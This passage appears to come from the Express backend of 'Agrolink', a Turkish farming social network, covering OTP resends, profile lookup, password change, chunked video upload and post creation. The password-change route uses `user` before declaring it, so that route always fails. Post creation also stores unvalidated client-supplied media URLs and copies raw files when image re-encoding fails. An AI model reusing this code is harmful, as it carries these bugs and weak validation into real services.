            try { decoded = jwt.verify(tempToken, JWT_SECRET, { algorithms: ['HS256'] }); }
            catch { return res.status(401).json({ error: 'Geçersiz oturum' }); }
            if (!decoded.pending2FA) return res.status(400).json({ error: 'Geçersiz istek' });
            const user = await dbGet(`SELECT id, email, name FROM users WHERE id = $1`, [decoded.id]);
            if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });
            await dbRun(`UPDATE two_factor_codes SET used = TRUE WHERE "userId" = $1 AND used = FALSE`, [user.id]);
            const newCode = crypto.randomInt(100000, 999999).toString();
            await dbRun(`INSERT INTO two_factor_codes (id,"userId",code,purpose,"expiresAt",used,"createdAt") VALUES ($1,$2,$3,$4,NOW()+INTERVAL '5 minutes',FALSE,NOW())`, [uuidv4(), user.id, newCode, 'login']);
            await sendTwoFactorCodeEmail(user.email, user.name, newCode, 'login').catch(() => {});
            return res.json({ message: 'Doğrulama kodu gönderildi' });
        } else if (email) {
            // Kayıt doğrulama kodu yeniden gönder
            const cleanEmail = email.toLowerCase().trim();
            const user = await dbGet(`SELECT id, email, name FROM users WHERE email = $1`, [cleanEmail]);
            if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });
            await dbRun(`UPDATE email_verifications SET used = TRUE WHERE "userId" = $1 AND used = FALSE`, [user.id]);
            const newCode = crypto.randomInt(100000, 999999).toString();
            await dbRun(`INSERT INTO email_verifications (id,"userId",email,code,"expiresAt") VALUES ($1,$2,$3,$4,NOW()+INTERVAL '15 minutes')`, [uuidv4(), user.id, cleanEmail, newCode]);
            await sendEmail(cleanEmail, '🌾 Agrolink — Yeni Doğrulama Kodunuz', `<div style="font-family:sans-serif;max-width:480px;margin:auto;padding:32px;background:#0a1628;border-radius:16px;color:#e2e8f0"><h2 style="color:#22c55e">Yeni Doğrulama Kodu</h2><p>E-posta doğrulama kodunuz:</p><div style="font-size:36px;font-weight:bold;letter-spacing:12px;color:#a855f7;padding:20px;background:rgba(124,58,237,0.1);border-radius:12px;text-align:center">${newCode}</div><p style="color:#94a3b8;font-size:13px;margin-top:16px">Bu kod 15 dakika geçerlidir.</p></div>`).catch(() => {});
            return res.json({ message: 'Doğrulama kodu gönderildi' });
        } else {
            return res.status(400).json({ error: 'email veya tempToken gerekli' });
        }
    } catch (e) { console.error('send-otp hatası:', e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 6. KULLANICI PROFİLİ ──────────────────────────────────────────
// ─── 6. KULLANICI PROFİLİ (ID veya username ile) ───────────────────
// Frontend'in v5'ten gelen tüm çağrıları uyumlu hale getirir:
//   GET /api/users/:id       → UUID ile arama (eski frontend)
//   GET /api/users/:username → username ile arama (yeni frontend)
app.get('/api/users/:idOrUsername', optionalAuth, async (req, res, next) => {
    // Bilinen statik endpoint'ler → kendi route'larına bırak
    const STATIC_SEGMENTS = [
        'blocks', 'blocked', 'online', 'search', 'following', 'followers',
        'top-followed', 'privacy-settings', 'nearby', 'recommendations',
        'suggestions', 'notification-settings', 'interests', 'profile',
        'profile-pic', 'privacy', 'account', '2fa', 'verification', 'me'
    ];
    const param = req.params.idOrUsername;
    if (STATIC_SEGMENTS.includes(param)) return next();

    try {
        // UUID formatı mı yoksa username mi?
        const isUUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(param);

        let user;
        if (isUUID) {
            // ID ile ara (v5 uyumlu)
            user = await dbGet(
                `SELECT id, username, name, "profilePic", "coverPic", bio, location, website,
                        "isVerified", "hasFarmerBadge", "userType", "isOnline", "lastSeen", "createdAt", "isBanned"
                 FROM users WHERE id = $1 AND "isActive" = TRUE`,
                [param]
            );
        } else {
            // Username ile ara
            user = await dbGet(
                `SELECT id, username, name, "profilePic", "coverPic", bio, location, website,
                        "isVerified", "hasFarmerBadge", "userType", "isOnline", "lastSeen", "createdAt", "isBanned"
                 FROM users WHERE username = $1 AND "isActive" = TRUE`,
                [param.toLowerCase()]
            );
        }

        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });

        // 🔒 Banlı kullanıcının kendi profiline baktığı durum:
        if (user.isBanned && req.user?.id === user.id) {
            return res.json({
                user: {
                    id: user.id, username: user.username, name: user.name,
                    profilePic: absoluteUrl(user.profilePic), coverPic: absoluteUrl(user.coverPic),
                    bio: user.bio, isVerified: user.isVerified, hasFarmerBadge: user.hasFarmerBadge,
                    userType: user.userType, createdAt: user.createdAt,
                    followingCount: 0, followerCount: 0, postCount: 0,
                    isFollowing: false, isBlocked: false, isOnline: false,
                    isBanned: true,
                },
                bannedProfile: true
            });
        }

        // 🔒 Başka birinin banlı profilini ziyaret ediyorsa: isim maskele
        if (user.isBanned) {
            return res.json({
                user: {
                    id: user.id, username: user.username,
                    name: 'Erişim Engeli - Politika İhlali',
                    profilePic: absoluteUrl(user.profilePic), coverPic: null,
                    bio: null, isVerified: false, hasFarmerBadge: false,
                    userType: user.userType, createdAt: user.createdAt,
                    followingCount: 0, followerCount: 0, postCount: 0,
                    isFollowing: false, isBlocked: false, isOnline: false,
                    isBanned: true,
                }
            });
        }

        const viewerId = req.user?.id || null;
        const [followingRow, followerRow, postRow, isFollowing, isBlocked, onlineRow] = await Promise.all([
            pool.query('SELECT COUNT(*)::int AS cnt FROM follows WHERE "followerId"  = $1', [user.id]),
            pool.query('SELECT COUNT(*)::int AS cnt FROM follows WHERE "followingId" = $1', [user.id]),
            pool.query('SELECT COUNT(*)::int AS cnt FROM posts   WHERE "userId" = $1 AND "isActive" = TRUE', [user.id]),
            viewerId ? dbGet('SELECT id FROM follows WHERE "followerId" = $1 AND "followingId" = $2', [viewerId, user.id]) : null,
            viewerId ? dbGet(`SELECT id FROM blocks WHERE ("blockerId"=$1 AND "blockedId"=$2) OR ("blockerId"=$2 AND "blockedId"=$1)`, [viewerId, user.id]) : null,
            pool.query('SELECT "isOnline", "lastSeen" FROM users WHERE id=$1', [user.id])
        ]);

        // 🔒 ENGEL KONTROLÜ — sadece giriş yapmış kullanıcılar için
        if (isBlocked && viewerId && user.id !== viewerId) {
            return res.status(403).json({ error: 'Engelli kullanıcı' });
        }

        const onlineData = onlineRow.rows[0];
        const isOnline = onlineData ? (onlineData.isOnline || (onlineData.lastSeen && Date.now() - new Date(onlineData.lastSeen).getTime() < 5 * 60 * 1000)) : false;

        res.json({
            user: {
                ...user,
                profilePic     : absoluteUrl(user.profilePic),
                coverPic       : absoluteUrl(user.coverPic),
                followingCount : followingRow.rows[0]?.cnt ?? 0,
                followerCount  : followerRow.rows[0]?.cnt  ?? 0,
                postCount      : postRow.rows[0]?.cnt      ?? 0,
                isFollowing    : !!isFollowing,
                isBlocked      : !!isBlocked,
                isOnline       : !!isOnline,
            }
        });
    } catch (error) {
        console.error('Profil hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ════════════════════════════════════════════════════════════════════
// 🔒 BANNED KULLANICI BLOKLAMA MİDDLEWARE
// authenticateToken'dan sonra hassas endpoint'lere ekle
// ════════════════════════════════════════════════════════════════════
function requireNotBanned(req, res, next) {
    if (req.user?.isBanned) {
        return res.status(403).json({
            error: 'Erişim Engeli',
            code: 'ACCOUNT_BANNED',
            message: 'Hesabınız politika ihlali nedeniyle kısıtlanmıştır.'
        });
    }
    next();
}

// ════════════════════════════════════════════════════════════════════
// 🌐 OPTİONAL AUTH — Token varsa doğrular, yoksa req.user=null ile devam eder
// Kamuya açık endpointlerde kullanılır (profil, postlar, yorumlar vs.)
// ════════════════════════════════════════════════════════════════════
async function optionalAuth(req, res, next) {
    let token = req.cookies?.access_token;
    if (!token) {
        const authHeader = req.headers['authorization'];
        if (authHeader && authHeader.startsWith('Bearer ')) {
            token = authHeader.slice(7);
        }
    }
    if (!token) {
        req.user = null;
        return next();
    }
    try {
        if (await isTokenBlacklisted(token)) { req.user = null; return next(); }
        const decoded = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });
        const user = await dbGet(
            `SELECT id, username, name, email, role, plan, "profilePic", "coverPic", bio,
                    "isVerified", "isActive", "userType", "hasFarmerBadge",
                    "isOnline", "isBanned", "emailVerified", "twoFactorEnabled"
             FROM users WHERE id = $1 AND "isActive" = TRUE`,
            [decoded.id]
        );
        if (!user) { req.user = null; return next(); }
        req.user = {
            id: user.id, username: user.username, name: user.name,
            email: user.email, role: user.role, plan: user.plan || 'free',
            profilePic: user.profilePic, isVerified: user.isVerified,
            hasFarmerBadge: user.hasFarmerBadge, userType: user.userType,
            isBanned: user.isBanned,
        };
    } catch {
        req.user = null;
    }
    next();
}

// isUserOnline yardımcı fonksiyonu (yok ise fallback)
async function isUserOnline(userId) {
    try {
        const u = await dbGet('SELECT "isOnline", "lastSeen" FROM users WHERE id=$1', [userId]);
        if (!u) return false;
        if (u.isOnline) return true;
        // Son 5 dakika içinde aktif mi?
        if (u.lastSeen) {
            const diff = Date.now() - new Date(u.lastSeen).getTime();
            return diff < 5 * 60 * 1000;
        }
        return false;
    } catch { return false; }
}

// ─── 7. PROFİL GÜNCELLE ────────────────────────────────────────────
app.put('/api/users/profile', authenticateToken, upload.fields([
    { name: 'profilePic', maxCount: 1 }, { name: 'coverPic', maxCount: 1 }
]), async (req, res) => {
    try {
        const { name, bio, location, website } = req.body;
        const updates = [];
        const params = [];
        let paramIdx = 1;

        if (name !== undefined) { updates.push(`name = $${paramIdx++}`); params.push(name.substring(0, 50)); }
        if (bio !== undefined) { updates.push(`bio = $${paramIdx++}`); params.push(bio.substring(0, 300)); }
        if (location !== undefined) { updates.push(`location = $${paramIdx++}`); params.push(location.substring(0, 100)); }
        if (website !== undefined) { updates.push(`website = $${paramIdx++}`); params.push(website.substring(0, 200)); }

        // ⚡ Profil ve kapak fotoğrafını PARALEL işle
        await Promise.all([
            (async () => {
                if (!req.files?.profilePic?.[0]) return;
                const file = req.files.profilePic[0];
                const filename = `profile_${req.user.id}_${Date.now()}.webp`;
                const outputPath = path.join(profilesDir, filename);
                // ✅ processImage: EXIF rotate + concurrency limiter + optimize quality
                await processImage(file.path, outputPath, { width: 300, height: 300, fit: 'cover', quality: 62, effort: 3 });
                await fs.unlink(file.path).catch(() => {});
                updates.push(`"profilePic" = $${paramIdx++}`);
                params.push(`/uploads/profiles/${filename}`);
            })(),
            (async () => {
                if (!req.files?.coverPic?.[0]) return;
                const file = req.files.coverPic[0];
                const filename = `cover_${req.user.id}_${Date.now()}.webp`;
                const outputPath = path.join(profilesDir, filename);
                // ✅ processImage: EXIF rotate + concurrency limiter + optimize quality
                await processImage(file.path, outputPath, { width: 1920, height: 1080, fit: 'inside', quality: 80, effort: 4 });
                await fs.unlink(file.path).catch(() => {});
                updates.push(`"coverPic" = $${paramIdx++}`);
                params.push(`/uploads/profiles/${filename}`);
            })(),
        ]);

        if (updates.length === 0) return res.status(400).json({ error: 'Güncellenecek alan yok' });

        updates.push(`"updatedAt" = NOW()`);
        params.push(req.user.id);

        await pool.query(`UPDATE users SET ${updates.join(', ')} WHERE id = $${paramIdx}`, params);

        const updated = await dbGet(
            'SELECT id, username, name, "profilePic", "coverPic", bio, location, website FROM users WHERE id = $1',
            [req.user.id]
        );

        res.json({ message: 'Profil güncellendi', user: formatUserUrls(updated) });
    } catch (error) {
        console.error('Profil güncelleme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 8. ŞİFRE DEĞİŞTİR ────────────────────────────────────────────
app.put('/api/auth/change-password', authenticateToken, async (req, res) => {
    try {
        const { currentPassword, newPassword } = req.body;
        if (!currentPassword || !newPassword) return res.status(400).json({ error: 'Şifreler gerekli' });
        if (newPassword.length < 8) return res.status(400).json({ error: 'Yeni şifre en az 8 karakter olmalıdır' });
        // 🔒 Şifre güvenlik kontrolü — eski şifreyle aynı olmamalı
        const sameAsCurrent = await bcrypt.compare(newPassword, user.password);
        if (sameAsCurrent) return res.status(400).json({ error: 'Yeni şifre eskisiyle aynı olamaz' });

        const user = await dbGet('SELECT password FROM users WHERE id = $1', [req.user.id]);
        const valid = await bcrypt.compare(currentPassword, user.password);
        if (!valid) return res.status(401).json({ error: 'Mevcut şifre yanlış' });

        const hashed = await bcrypt.hash(newPassword, BCRYPT_ROUNDS);
        await dbRun('UPDATE users SET password = $1, "updatedAt" = NOW() WHERE id = $2', [hashed, req.user.id]);

        // 🔒 GÜVENLİK: Şifre değişince tüm mevcut oturumları sonlandır
        // Çalınmış token / aktif oturum saldırısını engeller
        await dbRun(
            `UPDATE refresh_tokens SET "isActive" = FALSE WHERE "userId" = $1`,
            [req.user.id]
        );
        // Mevcut access token'ı da blacklist'e ekle
        if (req._token) await blacklistToken(req._token);

        // 📧 Bildirim e-postası
        const u = await dbGet('SELECT email, name FROM users WHERE id = $1', [req.user.id]);
        if (u) sendPasswordResetSuccessEmail(u.email, u.name).catch(() => {});

        res.json({ message: 'Şifre değiştirildi' });
    } catch (error) {
        console.error('Şifre değiştirme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 9. KULLANICI ARA ───────────────────────────────────────────────
app.get('/api/users/search/:query', authenticateToken, searchLimiter, async (req, res) => {
    try {
        const { query } = req.params;
        const searchTerm = `%${query.toLowerCase()}%`;

        const users = await dbAll(
            `SELECT id, username, name, "profilePic", "isVerified", "hasFarmerBadge", "isBanned"
             FROM users
             WHERE "isActive" = TRUE AND (LOWER(username) LIKE $1 OR LOWER(name) LIKE $1)
             ORDER BY "isVerified" DESC, "createdAt" DESC
             LIMIT 20`,
            [searchTerm]
        );

        res.json({
            users: users.map(u => ({
                ...u,
                profilePic : absoluteUrl(u.profilePic),
                // 🔒 Banlı kullanıcı: isim/soyisim maskelenir, username görünür kalır
                name       : u.isBanned ? 'Erişim Engeli - Politika İhlali' : u.name,
                bio        : u.isBanned ? null : u.bio,
                isBanned   : !!u.isBanned,
            }))
        });
    } catch (error) {
        console.error('Arama hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── TEKLI DOSYA YÜKLEME (UI sıralı yükleme için) ───────────────────
app.post('/api/upload', authenticateToken, uploadLimiter, upload.single('media'), async (req, res) => {
    try {
        if (!req.file) return res.status(400).json({ error: 'Dosya bulunamadı' });
        const file = req.file;
        const isVideo = file.mimetype.startsWith('video/');

        // 🔒 Magic bytes + boyut doğrulama (mavi tik kullanıcılar için 300MB limit)
        const uploadType = isVideo ? 'postVideo' : 'postImage';
        const videoLimit = isVideo ? getVideoLimit(req.user?.isVerified) : null;
        try { await verifyUploadedFile(file, uploadType, videoLimit); }
        catch (verifyErr) { return res.status(400).json({ error: verifyErr.message }); }

        let mediaUrl, mediaType;

        if (isVideo) {
            const videoId = `video_${uuidv4().replace(/-/g,"").slice(0,16)}`;
            const rawServedPath = path.join(videosDir, `${videoId}_raw.mp4`);
            await fs.copyFile(file.path, rawServedPath);
            await fs.unlink(file.path).catch(() => {});
            mediaUrl = `/uploads/videos/${videoId}_raw.mp4`;
            mediaType = 'video';
        } else {
            // 🔒 Re-encode: uzantı ne olursa olsun sharp ile yeniden işle
            const filename = `post_${uuidv4().replace(/-/g,"").slice(0,16)}.webp`;
            const destPath = path.join(postsDir, filename);
            try {
                // ✅ processImage: EXIF rotate fix + concurrency limiter + optimize quality
                await processImage(file.path, destPath, { width: 1920, height: 1920, fit: 'inside', quality: 78, effort: 4 });
            } catch {
                await fs.unlink(file.path).catch(() => {});
                return res.status(400).json({ error: 'Resim işlenemedi' });
            }
            await fs.unlink(file.path).catch(() => {});
            mediaUrl = `/uploads/posts/${filename}`;
            mediaType = 'image';
        }

        return res.json({ success: true, url: absoluteUrl(mediaUrl), mediaUrl: absoluteUrl(mediaUrl), type: mediaType });
    } catch (err) {
        console.error('❌ /api/upload hatası'); // 🔒 Detay loglanmıyor
        return res.status(500).json({ error: 'Dosya yüklenemedi' });
    }
});

// =============================================================================
// 📦 PARÇALI (CHUNKED) VİDEO YÜKLEME — 50MB+ videolar için
// =============================================================================
// Kotlin/Android kullanımı:
//   1. POST /api/upload/chunk/init        → { uploadId, chunkSize } al
//   2. PUT  /api/upload/chunk/:uploadId   → her chunk'ı gönder (0'dan başla)
//   3. POST /api/upload/chunk/:uploadId/finalize → birleştir, URL al
//
// Her chunk: multipart/form-data { chunk: File, index: number, total: number }
// =============================================================================

// Bellek içi chunk oturumları (üretimde Redis kullanılabilir)
const chunkSessions = new Map(); // uploadId → { userId, totalChunks, receivedChunks, tmpDir, filename, createdAt }

// Eski oturumları temizle (1 saat geçmiş olanlar)
setInterval(() => {
    const now = Date.now();
    for (const [id, s] of chunkSessions) {
        if (now - s.createdAt > 60 * 60 * 1000) {
            fs.rm(s.tmpDir, { recursive: true, force: true }).catch(() => {});
            chunkSessions.delete(id);
        }
    }
}, 10 * 60 * 1000);

// ─── 1. Oturumu başlat ─────────────────────────────────────────────────────
// POST /api/upload/chunk/init
// Body: { filename: "video.mp4", totalChunks: 8 }
app.post('/api/upload/chunk/init', authenticateToken, async (req, res) => {
    try {
        const { filename = 'video.mp4', totalChunks } = req.body;
        if (!totalChunks || isNaN(totalChunks) || totalChunks < 1 || totalChunks > 500) {
            return res.status(400).json({ error: 'totalChunks 1-500 arasında olmalı' });
        }

        const uploadId = uuidv4();
        const safeExt  = path.extname(sanitizeFilename(filename)).toLowerCase() || '.mp4';
        const allowedExts = ['.mp4', '.mov', '.avi', '.mkv', '.webm', '.m4v'];
        if (!allowedExts.includes(safeExt)) {
            return res.status(400).json({ error: 'Desteklenmeyen video formatı' });
        }

        const tmpDir = path.join(tempDir, `chunk_${uploadId}`);
        await fs.mkdir(tmpDir, { recursive: true });

        // 🔒 Disk bomb koruması: chunk sayısı × CHUNK_THRESHOLD_MB ≤ kullanıcı limiti
        // Normal: 100MB, Mavi tik: 300MB
        const userVideoLimit = getVideoLimit(req.user?.isVerified);
        const maxAllowedChunks = Math.ceil(userVideoLimit / (CHUNK_THRESHOLD_MB * 1024 * 1024));
        const safeChunkCount = Math.min(parseInt(totalChunks), maxAllowedChunks);
        if (parseInt(totalChunks) > maxAllowedChunks) {
            return res.status(400).json({
                error: `Toplam dosya boyutu limiti aşılıyor. Maksimum ${Math.round(userVideoLimit/1024/1024)} MB${req.user?.isVerified ? ' (mavi tik)' : ' — mavi tik ile 300MB\'a kadar yükleyebilirsiniz'}`
            });
        }

        chunkSessions.set(uploadId, {
            userId        : req.user.id,
            isVerified    : !!req.user?.isVerified,  // 🔒 Limit kontrolü için sakla
            videoLimit    : userVideoLimit,           // Kullanıcıya özel byte limiti
            totalChunks   : safeChunkCount,
            receivedChunks: new Set(),
            receivedBytes : 0,
            tmpDir,
            safeExt,
            createdAt     : Date.now(),
        });

        res.json({
            uploadId,
            chunkSize  : CHUNK_THRESHOLD_MB * 1024 * 1024, // tavsiye edilen chunk boyutu (bytes)
            maxChunks  : 500,
            message    : 'Yükleme oturumu başlatıldı',
        });
    } catch (e) {
        console.error('chunk/init hatası:', e);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 2. Chunk gönder ────────────────────────────────────────────────────────
// PUT /api/upload/chunk/:uploadId
// Form: { chunk: binary, index: number }
app.put('/api/upload/chunk/:uploadId', authenticateToken, upload.single('chunk'), async (req, res) => {
    try {
        const { uploadId } = req.params;
        const session = chunkSessions.get(uploadId);

        if (!session) return res.status(404).json({ error: 'Yükleme oturumu bulunamadı veya süresi doldu' });
        if (session.userId !== req.user.id) return res.status(403).json({ error: 'Yetkisiz' });
        if (!req.file) return res.status(400).json({ error: 'Chunk verisi eksik' });

        const idx = parseInt(req.body.index);
        if (isNaN(idx) || idx < 0 || idx >= session.totalChunks) {
            await fs.unlink(req.file.path).catch(() => {});
            return res.status(400).json({ error: 'Geçersiz chunk index' });
        }

        // Chunk'ı oturumun tmp dizinine kaydet
        const chunkPath = path.join(session.tmpDir, `chunk_${String(idx).padStart(6, '0')}`);
        await fs.rename(req.file.path, chunkPath);
        session.receivedChunks.add(idx);
        session.receivedBytes = (session.receivedBytes || 0) + req.file.size;
        // 🔒 Toplam alınan byte limiti aş → session iptal et (kullanıcı bazlı limit)
        const sessionLimit = session.videoLimit || UPLOAD_LIMITS.postVideo;
        if (session.receivedBytes > sessionLimit) {
            chunkSessions.delete(uploadId);
            await fs.rm(session.tmpDir, { recursive: true, force: true }).catch(() => {});
            return res.status(400).json({ error: `Dosya boyutu limiti aşıldı. Maksimum: ${Math.round(sessionLimit/1024/1024)} MB` });
        }

        res.json({
            uploadId,
            received   : session.receivedChunks.size,
            total      : session.totalChunks,
            index      : idx,
            done       : session.receivedChunks.size === session.totalChunks,
        });
    } catch (e) {
        console.error('chunk/put hatası:', e);
        res.status(500).json({ error: 'Chunk kaydedilemedi' });
    }
});

// ─── 3. Birleştir ve URL al ─────────────────────────────────────────────────
// POST /api/upload/chunk/:uploadId/finalize
app.post('/api/upload/chunk/:uploadId/finalize', authenticateToken, async (req, res) => {
    try {
        const { uploadId } = req.params;
        const session = chunkSessions.get(uploadId);

        if (!session) return res.status(404).json({ error: 'Yükleme oturumu bulunamadı' });
        if (session.userId !== req.user.id) return res.status(403).json({ error: 'Yetkisiz' });

        // Eksik chunk var mı?
        const missing = [];
        for (let i = 0; i < session.totalChunks; i++) {
            if (!session.receivedChunks.has(i)) missing.push(i);
        }
        if (missing.length > 0) {
            return res.status(400).json({ error: 'Eksik chunk\'lar', missing });
        }

        // Tüm chunk'ları sırayla birleştir
        const videoId   = `video_${uuidv4().replace(/-/g,"").slice(0,16)}`;
        const finalPath = path.join(tempDir, `${videoId}_raw${session.safeExt}`);
        const writeStream = fssync.createWriteStream(finalPath);

        for (let i = 0; i < session.totalChunks; i++) {
            const chunkPath = path.join(session.tmpDir, `chunk_${String(i).padStart(6, '0')}`);
            const data = await fs.readFile(chunkPath);
            await new Promise((resolve, reject) => {
                writeStream.write(data, (err) => err ? reject(err) : resolve());
            });
        }
        await new Promise((resolve) => writeStream.end(resolve));

        // Tmp oturumunu temizle
        await fs.rm(session.tmpDir, { recursive: true, force: true }).catch(() => {});
        chunkSessions.delete(uploadId);

        // Ham dosyayı videos dizinine taşı
        const rawServedPath = path.join(videosDir, `${videoId}_raw.mp4`);
        await fs.rename(finalPath, rawServedPath);

        // 🔒 GÜVENLİK: Birleştirilen videoyu da magic-bytes + derin tarama ile doğrula
        try {
            await verifyUploadedFile(
                { path: rawServedPath, mimetype: 'video/mp4', size: (await fs.stat(rawServedPath)).size },
                'postVideo',
                session.videoLimit || UPLOAD_LIMITS.postVideo
            );
        } catch (verifyErr) {
            await fs.unlink(rawServedPath).catch(() => {});
            return res.status(400).json({ error: `Güvenlik kontrolü başarısız: ${verifyErr.message}` });
        }

        const rawUrl = absoluteUrl(`/uploads/videos/${videoId}_raw.mp4`);

        res.json({
            success  : true,
            uploadId,
            videoId,
            url      : rawUrl,
            mediaUrl : rawUrl,
            type     : 'video',
            message  : 'Video birleştirildi. Post oluştururken bu URL\'yi kullanın.',
        });
    } catch (e) {
        console.error('chunk/finalize hatası:', e);
        res.status(500).json({ error: 'Video birleştirilemedi' });
    }
});

// ─── 4. Oturum durumu sorgula ────────────────────────────────────────────────
// GET /api/upload/chunk/:uploadId/status
app.get('/api/upload/chunk/:uploadId/status', authenticateToken, (req, res) => {
    const session = chunkSessions.get(req.params.uploadId);
    if (!session) return res.status(404).json({ error: 'Oturum bulunamadı' });
    if (session.userId !== req.user.id) return res.status(403).json({ error: 'Yetkisiz' });
    res.json({
        uploadId        : req.params.uploadId,
        received        : session.receivedChunks.size,
        total           : session.totalChunks,
        missingCount    : session.totalChunks - session.receivedChunks.size,
        ready           : session.receivedChunks.size === session.totalChunks,
    });
});

// ─── 5. Chunk boyut bilgisi (Kotlin için) ────────────────────────────────────
// GET /api/upload/chunk/config
app.get('/api/upload/chunk/config', authenticateToken, (req, res) => {
    const userVideoLimit = getVideoLimit(req.user?.isVerified);
    res.json({
        chunkThresholdMB  : CHUNK_THRESHOLD_MB,
        recommendedChunkMB: 10,
        maxFileSizeMB     : Math.round(userVideoLimit / 1024 / 1024),
        maxChunks         : 500,
        isVerified        : !!req.user?.isVerified,
        note              : req.user?.isVerified
            ? '🔵 Mavi tik: 300 MB video yükleyebilirsiniz'
            : '⚪ Normal hesap: 100 MB. Mavi tik ile 300 MB\'a çıkar.',
    });
});

// =============================================================================
// END CHUNKED UPLOAD
// =============================================================================

// ─── 10. GÖNDERI OLUŞTUR ────────────────────────────────────────────
app.post('/api/posts', authenticateToken, postCreateLimiter, checkRestriction('post'), upload.array('media', 10), async (req, res) => {
    try {
        const { content = '', isPoll, pollQuestion, pollOptions, latitude, longitude, locationName, allowComments = 'true', uploadedUrls: uploadedUrlsRaw } = req.body;
        const isAnketMode = isPoll === 'true' || isPoll === true;
        const hasText = content && content.trim().length > 0;
        const hasMedia = req.files && req.files.length > 0;
        // Önceden /api/upload ile yüklenmiş URL'ler
        let preUploadedItems = [];
        if (uploadedUrlsRaw) {
            try { preUploadedItems = JSON.parse(uploadedUrlsRaw); } catch(e) { preUploadedItems = []; }
        }
        const hasPreUploaded = preUploadedItems.length > 0;
        const hasPoll = isAnketMode && pollQuestion;

        if (!hasText && !hasMedia && !hasPreUploaded && !hasPoll) {
            return res.status(400).json({ error: 'Boş gönderi oluşturulamaz' });
        }

        const user = await dbGet('SELECT id, username, "userType" FROM users WHERE id = $1', [req.user.id]);
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });

        let media = null;
        let mediaType = 'text';
        let mediaWidth = null;
        let mediaHeight = null;
        const allMediaItems = []; // { url, type, width, height }

        if (hasMedia) {
            for (let fi = 0; fi < req.files.length; fi++) {
                const file = req.files[fi];
                const isVideo = file.mimetype.startsWith('video/');

                // 🔒 Magic bytes + tip bazlı boyut doğrulama (mavi tik → 300MB, normal → 100MB)
                const videoLimit = isVideo ? getVideoLimit(req.user?.isVerified) : null;
                try { await verifyUploadedFile(file, isVideo ? 'postVideo' : 'postImage', videoLimit); }
                catch (verifyErr) {
                    // Kalan temp dosyaları temizle
                    for (const f of req.files) await fs.unlink(f.path).catch(() => {});
                    return res.status(400).json({ error: verifyErr.message });
                }

                if (isVideo) {
                    const videoId  = `video_${uuidv4().replace(/-/g,"").slice(0,16)}`;
                    const tempPath = path.join(tempDir, `${videoId}_raw${path.extname(file.originalname).toLowerCase() || '.mp4'}`);
                    const rawServedPath = path.join(videosDir, `${videoId}_raw.mp4`);

                    await fs.copyFile(file.path, tempPath);
                    await fs.copyFile(file.path, rawServedPath);
                    await fs.unlink(file.path).catch(() => {});

                    const videoUrl = `/uploads/videos/${videoId}_raw.mp4`;
                    allMediaItems.push({ url: videoUrl, type: 'video', width: null, height: null });

                    if (fi === 0) {
                        media     = videoUrl;
                        mediaType = 'video';
                        req._pendingVideo = { videoId, tempPath };
                    }
                } else {
                    const filename = `img_${uuidv4().replace(/-/g,"").slice(0,16)}.webp`;
                    const outputPath = path.join(postsDir, filename);
                    let imgWidth = null, imgHeight = null;
                    try {
                        // ✅ processImage: EXIF rotate fix + concurrency limiter
                        const info = await processImage(file.path, outputPath, { width: 1920, height: 1920, fit: 'inside', quality: 78, effort: 4 });
                        imgWidth = info.width || null;
                        imgHeight = info.height || null;
                    } catch (e) {
                        await fs.copyFile(file.path, outputPath);
                    }
                    await fs.unlink(file.path).catch(() => {});

                    const imgUrl = `/uploads/posts/${filename}`;
                    allMediaItems.push({ url: imgUrl, type: 'image', width: imgWidth, height: imgHeight });

                    if (fi === 0) {
                        media     = imgUrl;
                        mediaType = 'image';
                        mediaWidth = imgWidth;
                        mediaHeight = imgHeight;
                    }
                }
            }
        }

        // Önceden /api/upload ile yüklenen dosyaları ekle (UI sıralı yükleme)
        if (hasPreUploaded && allMediaItems.length === 0) {
            for (let i = 0; i < preUploadedItems.length; i++) {
                const item = preUploadedItems[i];
                allMediaItems.push({ url: item.url, type: item.type || 'image', width: null, height: null });
                if (i === 0) {
                    media = item.url;
                    mediaType = item.type || 'image';
                }
            }
        }

        // mediaUrls JSON: birden fazlaysa array, tekse de array (tek medya bile olsa)
        const mediaUrlsJson = allMediaItems.length > 0 ? JSON.stringify(allMediaItems) : null;

        const postId = uuidv4();
        let parsedPollOptions = null;
        if (hasPoll && pollOptions) {
            try {
                const opts = typeof pollOptions === 'string' ? JSON.parse(pollOptions) : pollOptions;
                parsedPollOptions = JSON.stringify(opts.map((o, i) => ({ id: i, text: o, votes: 0 })));
            } catch (e) { parsedPollOptions = null; }
        }

        // ⚡ RETURNING * ile ekstra SELECT turu önlendi (performans)
        const insertResult = await pool.query(
            `INSERT INTO posts (id, "userId", username, content, media, "mediaType", "mediaUrls", "mediaWidth", "mediaHeight",
             "isPoll", "pollQuestion", "pollOptions",
             latitude, longitude, "locationName", "allowComments", "isActive", "createdAt", "updatedAt")
             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,TRUE,NOW(),NOW())
             RETURNING *`,
            [postId, req.user.id, user.username, content || '', media, mediaType, mediaUrlsJson,
             mediaWidth, mediaHeight, isAnketMode, pollQuestion || null, parsedPollOptions,
             latitude ? parseFloat(latitude) : null, longitude ? parseFloat(longitude) : null,
             locationName || null, allowComments !== 'false']
        );
        const postRow = insertResult.rows[0];

        // post_media tablosuna da ekle (çoklu medya için)
        if (allMediaItems.length > 0) {
            for (let i = 0; i < allMediaItems.length; i++) {
                const m = allMediaItems[i];
                await dbRun(
                    `INSERT INTO post_media (id, "postId", url, "mediaType", width, height, "sortOrder", "createdAt")
                     VALUES ($1,$2,$3,$4,$5,$6,$7,NOW())
                     ON CONFLICT DO NOTHING`,
                    [uuidv4(), postId, m.url, m.type, m.width, m.height, i]
                ).catch(() => {});
            }
        }

